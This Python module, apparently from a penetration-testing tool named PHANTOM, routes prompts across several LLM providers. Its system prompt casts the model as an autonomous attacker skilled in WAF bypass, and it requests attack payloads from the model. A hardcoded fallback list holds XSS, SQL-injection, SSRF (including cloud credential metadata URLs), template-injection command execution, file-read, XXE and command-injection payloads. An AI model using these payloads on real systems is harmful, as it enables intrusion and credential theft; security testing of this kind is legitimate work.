"""
LLM Engine — Multi-provider AI interface.

Priority chain:
1. Claude API (Anthropic) — best quality, OAuth or API key
2. DeepSeek API — strong coding/security reasoning, cheap
3. OpenAI-compatible API — GPT-4o or any compatible endpoint
4. Fallback — hardcoded rules when no LLM available

Set keys in .env or Redis. Engine auto-detects available providers.
"""
import json
import logging
import re

import httpx
from app.config import get_settings

settings = get_settings()
logger = logging.getLogger(__name__)

SYSTEM_PROMPT = """You are PHANTOM, an expert autonomous penetration testing AI.
You analyze web applications for security vulnerabilities.
You are precise, methodical, and always respond in structured JSON when requested.
You have deep knowledge of OWASP Top 10, CVEs, exploit techniques, WAF bypass methods, and payload crafting.
Always think step by step and provide actionable recommendations.
IMPORTANT: When asked for JSON, respond ONLY with valid JSON. No markdown, no explanation, no code fences."""


class LLMEngine:
    def __init__(self):
        from app.ai.get_claude_key import get_claude_api_key
        self.claude_api_key = get_claude_api_key() or settings.anthropic_api_key
        self.claude_model = settings.claude_model
        self.client = httpx.AsyncClient(timeout=180.0)
        self._provider = None  # "claude", "deepseek", "openai", or None
        self._is_oauth = self._detect_oauth()
        self._provider_chain = []  # ordered list of available providers

    def _detect_oauth(self) -> bool:
        if self.claude_api_key and self.claude_api_key.startswith("sk-ant-oat"):
            return True
        return False

    def _claude_headers(self) -> dict:
        if self._is_oauth:
            return {
                "Authorization": f"Bearer {self.claude_api_key}",
                "anthropic-version": "2023-06-01",
                "anthropic-beta": "oauth-2025-04-20",
                "content-type": "application/json",
            }
        return {
            "x-api-key": self.claude_api_key,
            "anthropic-version": "2023-06-01",
            "content-type": "application/json",
        }

    def _refresh_key(self):
        # First try auto-refresh via OAuth refresh token
        try:
            from app.ai.get_claude_key import _refresh_oauth_token, _is_token_expired
            if _is_token_expired():
                new_token = _refresh_oauth_token()
                if new_token:
                    logger.info("LLM key auto-refreshed via OAuth (%s...)", new_token[:20])
                    self.claude_api_key = new_token
                    self._is_oauth = self._detect_oauth()
                    self._provider = None
                    return True
        except Exception as e:
            logger.debug(f"OAuth auto-refresh attempt failed: {e}")

        # Fallback: re-read from Redis (maybe someone updated it manually)
        from app.ai.get_claude_key import get_claude_api_key
        new_key = get_claude_api_key() or settings.anthropic_api_key
        if new_key and new_key != self.claude_api_key:
            logger.info("LLM key refreshed from Redis (%s...)", new_key[:20])
            self.claude_api_key = new_key
            self._is_oauth = self._detect_oauth()
            self._provider = None
            return True
        self._provider = None
        return False

    @property
    def provider(self) -> str:
        return self._provider or "none"

    # ──────────────────────────────────────────
    # Provider detection — builds priority chain
    # ──────────────────────────────────────────

    async def _detect_provider(self) -> str | None:
        """Detect best available LLM provider. Tries chain: Claude → DeepSeek → OpenAI."""
        if self._provider is not None:
            return self._provider

        # 1. Claude
        provider = await self._probe_claude()
        if provider:
            return provider

        # 2. DeepSeek
        provider = await self._probe_openai_compatible(
            "deepseek",
            settings.deepseek_api_key,
            settings.deepseek_base_url,
            settings.deepseek_model,
        )
        if provider:
            return provider

        # 3. OpenAI / compatible
        provider = await self._probe_openai_compatible(
            "openai",
            settings.openai_api_key,
            settings.openai_base_url,
            settings.openai_model,
        )
        if provider:
            return provider

        # 4. Also check Redis for fallback keys
        provider = await self._probe_redis_fallback_keys()
        if provider:
            return provider

        self._provider = None
        logger.warning("No LLM provider available (set ANTHROPIC_API_KEY, DEEPSEEK_API_KEY, or OPENAI_API_KEY)")
        return None

    async def _probe_claude(self) -> str | None:
        """Test Claude API availability."""
        if not (self.claude_api_key and len(self.claude_api_key) > 10
                and not self.claude_api_key.startswith("your_")):
            return None
        try:
            resp = await self.client.post(
                "https://api.anthropic.com/v1/messages",
                headers=self._claude_headers(),
                json={
                    "model": self.claude_model,
                    "max_tokens": 1,
                    "messages": [{"role": "user", "content": "hi"}],
                },
                timeout=10.0,
            )
            if resp.status_code in (200, 400, 429):
                self._provider = "claude"
                logger.info("LLM provider: Claude API (%s)", "OAuth" if self._is_oauth else "API key")
                return self._provider
            elif resp.status_code == 401:
                logger.warning("Claude API 401 — refreshing key...")
                if self._refresh_key():
                    resp2 = await self.client.post(
                        "https://api.anthropic.com/v1/messages",
                        headers=self._claude_headers(),
                        json={"model": self.claude_model, "max_tokens": 1,
                              "messages": [{"role": "user", "content": "hi"}]},
                        timeout=10.0,
                    )
                    if resp2.status_code in (200, 400, 429):
                        self._provider = "claude"
                        logger.info("LLM provider: Claude API (after refresh)")
                        return self._provider
                logger.warning("Claude API key invalid (401)")
            else:
                logger.warning("Claude API returned %s", resp.status_code)
        except Exception as e:
            logger.warning("Claude API detection error: %s", e)
        return None

    async def _probe_openai_compatible(
        self, name: str, api_key: str, base_url: str, model: str
    ) -> str | None:
        """Test an OpenAI-compatible API (DeepSeek, OpenAI, etc.)."""
        if not api_key or api_key.startswith("your_"):
            return None
        try:
            resp = await self.client.post(
                f"{base_url.rstrip('/')}/chat/completions",
                headers={
                    "Authorization": f"Bearer {api_key}",
                    "content-type": "application/json",
                },
                json={
                    "model": model,
                    "max_tokens": 1,
                    "messages": [{"role": "user", "content": "hi"}],
                },
                timeout=10.0,
            )
            if resp.status_code in (200, 400, 429):
                self._provider = name
                logger.info("LLM provider: %s (%s)", name, model)
                return self._provider
            logger.warning("%s API returned %s", name, resp.status_code)
        except Exception as e:
            logger.warning("%s API detection error: %s", name, e)
        return None

    async def _probe_redis_fallback_keys(self) -> str | None:
        """Check Redis for additional LLM keys (set via UI)."""
        try:
            import redis as redis_lib
            r = redis_lib.from_url(settings.redis_url)

            # DeepSeek from Redis
            ds_key = r.get("phantom:settings:deepseek_api_key")
            if ds_key:
                ds_key = ds_key.decode() if isinstance(ds_key, bytes) else ds_key
                if ds_key and not ds_key.startswith("your_"):
                    result = await self._probe_openai_compatible(
                        "deepseek", ds_key,
                        settings.deepseek_base_url, settings.deepseek_model,
                    )
                    if result:
                        return result

            # OpenAI from Redis
            oai_key = r.get("phantom:settings:openai_api_key")
            if oai_key:
                oai_key = oai_key.decode() if isinstance(oai_key, bytes) else oai_key
                if oai_key and not oai_key.startswith("your_"):
                    result = await self._probe_openai_compatible(
                        "openai", oai_key,
                        settings.openai_base_url, settings.openai_model,
                    )
                    if result:
                        return result
        except Exception:
            pass
        return None

    async def is_available(self) -> bool:
        provider = await self._detect_provider()
        return provider is not None

    # ──────────────────────────────────────────
    # Main API: analyze / analyze_json
    # ──────────────────────────────────────────

    async def analyze(self, prompt: str, temperature: float = 0.3, max_tokens: int = 4096) -> str:
        """Send prompt to best available LLM. Auto-fallback on failure."""
        provider = await self._detect_provider()

        if provider == "claude":
            try:
                return await self._call_claude(prompt, temperature, max_tokens)
            except LLMError:
                # Claude failed — try fallback
                logger.warning("Claude failed, trying fallback providers...")
                self._provider = None
                fallback = await self._try_fallback(prompt, temperature, max_tokens)
                if fallback is not None:
                    return fallback
                raise

        elif provider in ("deepseek", "openai"):
            try:
                return await self._call_openai_compatible(prompt, temperature, max_tokens)
            except LLMError:
                raise

        raise LLMError("No LLM provider available (set ANTHROPIC_API_KEY, DEEPSEEK_API_KEY, or OPENAI_API_KEY)")

    async def _try_fallback(self, prompt: str, temperature: float, max_tokens: int) -> str | None:
        """Try DeepSeek and OpenAI as fallbacks when primary fails."""
        for name, api_key, base_url, model in [
            ("deepseek", settings.deepseek_api_key, settings.deepseek_base_url, settings.deepseek_model),
            ("openai", settings.openai_api_key, settings.openai_base_url, settings.openai_model),
        ]:
            if not api_key or api_key.startswith("your_"):
                continue
            try:
                self._provider = name
                result = await self._call_openai_compatible(prompt, temperature, max_tokens)
                logger.info("Fallback to %s succeeded", name)
                return result
            except Exception as e:
                logger.warning("Fallback %s failed: %s", name, e)
                self._provider = None
                continue

        # Also try Redis keys
        try:
            import redis as redis_lib
            r = redis_lib.from_url(settings.redis_url)
            for redis_key, name, base_url, model in [
                ("phantom:settings:deepseek_api_key", "deepseek", settings.deepseek_base_url, settings.deepseek_model),
                ("phantom:settings:openai_api_key", "openai", settings.openai_base_url, settings.openai_model),
            ]:
                api_key = r.get(redis_key)
                if api_key:
                    api_key = api_key.decode() if isinstance(api_key, bytes) else api_key
                    if api_key and not api_key.startswith("your_"):
                        try:
                            self._provider = name
                            # Temporarily set the key for the call
                            result = await self._call_openai_compat_direct(
                                api_key, base_url, model, prompt, temperature, max_tokens
                            )
                            logger.info("Fallback to %s (Redis) succeeded", name)
                            return result
                        except Exception:
                            self._provider = None
        except Exception:
            pass

        return None

    # ──────────────────────────────────────────
    # Provider-specific call implementations
    # ──────────────────────────────────────────

    async def _call_claude(self, prompt: str, temperature: float, max_tokens: int = 4096) -> str:
        """Call Claude API with auto-retry on 401."""
        try:
            response = await self.client.post(
                "https://api.anthropic.com/v1/messages",
                headers=self._claude_headers(),
                json={
                    "model": self.claude_model,
                    "max_tokens": max_tokens,
                    "temperature": temperature,
                    "system": SYSTEM_PROMPT,
                    "messages": [{"role": "user", "content": prompt}],
                },
            )

            if response.status_code == 401:
                logger.warning("Claude 401 in _call_claude — refreshing key...")
                if self._refresh_key():
                    response = await self.client.post(
                        "https://api.anthropic.com/v1/messages",
                        headers=self._claude_headers(),
                        json={
                            "model": self.claude_model,
                            "max_tokens": max_tokens,
                            "temperature": temperature,
                            "system": SYSTEM_PROMPT,
                            "messages": [{"role": "user", "content": prompt}],
                        },
                    )

            response.raise_for_status()
            data = response.json()
            content = data.get("content", [])
            if content:
                return content[0].get("text", "")
            return ""
        except httpx.TimeoutException:
            raise LLMError("Claude API request timed out (180s)")
        except httpx.HTTPStatusError as e:
            raise LLMError(f"Claude API error: {e.response.status_code} {e.response.text[:200]}")
        except Exception as e:
            raise LLMError(f"Claude API error: {str(e)}")

    async def _call_openai_compatible(self, prompt: str, temperature: float, max_tokens: int = 4096) -> str:
        """Call DeepSeek/OpenAI via OpenAI-compatible API."""
        if self._provider == "deepseek":
            api_key = settings.deepseek_api_key
            base_url = settings.deepseek_base_url
            model = settings.deepseek_model
        else:
            api_key = settings.openai_api_key
            base_url = settings.openai_base_url
            model = settings.openai_model

        return await self._call_openai_compat_direct(
            api_key, base_url, model, prompt, temperature, max_tokens
        )

    async def _call_openai_compat_direct(
        self, api_key: str, base_url: str, model: str,
        prompt: str, temperature: float, max_tokens: int,
    ) -> str:
        """Direct call to any OpenAI-compatible endpoint."""
        try:
            response = await self.client.post(
                f"{base_url.rstrip('/')}/chat/completions",
                headers={
                    "Authorization": f"Bearer {api_key}",
                    "content-type": "application/json",
                },
                json={
                    "model": model,
                    "max_tokens": max_tokens,
                    "temperature": temperature,
                    "messages": [
                        {"role": "system", "content": SYSTEM_PROMPT},
                        {"role": "user", "content": prompt},
                    ],
                },
            )
            response.raise_for_status()
            data = response.json()
            choices = data.get("choices", [])
            if choices:
                return choices[0].get("message", {}).get("content", "")
            return ""
        except httpx.TimeoutException:
            raise LLMError(f"{self._provider} API timed out")
        except httpx.HTTPStatusError as e:
            raise LLMError(f"{self._provider} API error: {e.response.status_code}")
        except Exception as e:
            raise LLMError(f"{self._provider} API error: {str(e)}")

    # ──────────────────────────────────────────
    # JSON analysis
    # ──────────────────────────────────────────

    async def analyze_json(self, prompt: str, temperature: float = 0.2, max_tokens: int = 4096) -> dict:
        """Send prompt and parse JSON response. Retries once on parse failure."""
        result = await self.analyze(prompt, temperature, max_tokens=max_tokens)
        parsed = self._extract_json(result)
        if parsed is not None:
            return parsed

        retry_prompt = (
            prompt + "\n\nIMPORTANT: Respond with ONLY valid JSON. "
            "No markdown code fences, no explanation text."
        )
        result = await self.analyze(retry_prompt, temperature=0.1, max_tokens=max_tokens)
        parsed = self._extract_json(result)
        if parsed is not None:
            return parsed

        raise LLMError(f"Failed to parse JSON from LLM response: {result[:200]}")

    def _extract_json(self, text: str) -> dict | list | None:
        """Extract JSON from LLM response, handling code fences and extra text."""
        text = text.strip()
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            pass

        if "```" in text:
            match = re.search(r"```(?:json)?\s*\n?(.*?)```", text, re.DOTALL)
            if match:
                try:
                    return json.loads(match.group(1).strip())
                except json.JSONDecodeError:
                    pass

        for pattern in [r'\{[\s\S]*\}', r'\[[\s\S]*\]']:
            match = re.search(pattern, text)
            if match:
                try:
                    return json.loads(match.group(0))
                except json.JSONDecodeError:
                    continue

        cleaned = re.sub(r',\s*([}\]])', r'\1', text)
        for pattern in [r'\{[\s\S]*\}', r'\[[\s\S]*\]']:
            match = re.search(pattern, cleaned)
            if match:
                try:
                    return json.loads(match.group(0))
                except json.JSONDecodeError:
                    continue

        return None

    # ──────────────────────────────────────────
    # Payload generation with fallback
    # ──────────────────────────────────────────

    async def generate_payloads(self, vuln_type: str, context: dict) -> list[str]:
        """Generate attack payloads for a specific vulnerability type."""
        prompt = f"""Generate 15 advanced {vuln_type} payloads for penetration testing.

Context:
- Technology: {context.get('technology', 'unknown')}
- WAF: {context.get('waf', 'none')}
- Parameter type: {context.get('param_type', 'string')}
- Injection point: {context.get('injection_point', 'parameter')}

Requirements:
- Mix of basic detection payloads and advanced exploitation payloads
- Include WAF bypass variants if WAF is present
- Include encoding variations
- Prioritize payloads most likely to succeed against the detected technology

Respond as a JSON array of strings. ONLY the JSON array, nothing else.
Example: ["payload1", "payload2"]"""

        try:
            result = await self.analyze(prompt)
            parsed = self._extract_json(result)
            if isinstance(parsed, list) and len(parsed) > 0:
                return [str(p) for p in parsed]
        except LLMError:
            pass

        return self._fallback_payloads(vuln_type)

    def _fallback_payloads(self, vuln_type: str) -> list[str]:
        """Hardcoded fallback payloads with randomized markers for SSTI."""
        import random
        _ssti_marker = random.randint(10000, 99999)
        payloads = {
            "xss": [
                # HTML body context — basic tag injection
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<svg/onload=alert(1)>',
                '<img src=x onerror=alert`1`>',
                '<dETAILS/oPEN/oNTOGGLE=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<body onpageshow=alert(1)>',
                '<video><source onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>',
                '<marquee onstart=alert(1)>',
                # Attribute breakout — double quote context
                '"><img src=x onerror=alert(1)>',
                '"><svg/onload=alert(1)>',
                '" onmouseover="alert(1)',
                '" onfocus="alert(1)" autofocus="',
                '"autofocus onfocus="alert(1)',
                # Attribute breakout — single quote context
                "'><img src=x onerror=alert(1)>",
                "' onmouseover='alert(1)",
                "' onfocus='alert(1)' autofocus='",
                # JavaScript string breakout
                "';alert(1)//",
                '";alert(1)//',
                '</script><script>alert(1)</script>',
                "'-alert(1)-'",
                # URL/href context
                'javascript:alert(1)',
                'javascript:alert(document.domain)',
                # Polyglot — works across multiple contexts
                '\'"--><svg/onload=alert(1)>//',
                '"><img src=x onerror=alert(1)>\'><svg/onload=alert(1)>',
                # Encoding tricks for WAF bypass
                '<img src=x oNeRrOr=alert(1)>',
                '<ScRiPt>alert(1)</ScRiPt>',
                # Angular/template
                '{{constructor.constructor("alert(1)")()}}',
            ],
            "sqli": [
                "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
                "admin'--", "1' AND SLEEP(5)--", "1' AND (SELECT SLEEP(5))--",
                "1';WAITFOR DELAY '0:0:5'--", "1' AND pg_sleep(5)--",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
                "1' ORDER BY 1--", "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--", "1'/*!50000OR*/1=1--",
                "1'/**/OR/**/1=1--", "-1' UNION ALL SELECT NULL--",
                '{"$gt":""}',
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://127.0.0.1", "http://localhost", "http://[::1]",
                "http://0x7f000001", "http://0177.0.0.1", "file:///etc/passwd",
                "gopher://127.0.0.1:6379/_INFO%0d%0a",
                "http://evil.com@127.0.0.1",
                "http://10.0.0.1", "http://172.16.0.1", "http://192.168.1.1",
            ],
            "ssti": [
                f"{{{{{_ssti_marker}*2}}}}", f"${{{_ssti_marker}*2}}",
                f"#{{{_ssti_marker}*2}}", f"<%= {_ssti_marker}*2 %>",
                "{{7*'7'}}", "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
                "{{config}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "<%= system('id') %>",
            ],
            "lfi": [
                "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
                "%2e%2e/%2e%2e/etc/passwd", "/etc/passwd%00",
                "....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "php://input", "/proc/self/environ",
            ],
            "cmd_injection": [
                "; id", "| id", "$(id)", "`id`", "|| id", "&& id",
                "%0aid", "; sleep 5", "| sleep 5", "$(sleep 5)",
                "; cat /etc/passwd", "| cat /etc/passwd",
            ],
            "open_redirect": [
                "//evil.com", "https://evil.com", "/\\evil.com",
                "//evil.com/%2f..", "////evil.com",
            ],
            "idor": [
                "1", "0", "-1", "999999", "admin",
                "../1", "null", "undefined",
                "00000000-0000-0000-0000-000000000000",
                "1&admin=true", "1&role=admin",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            ],
        }
        return payloads.get(vuln_type, payloads.get("xss", []))

    async def close(self):
        await self.client.aclose()


class LLMError(Exception):
    pass
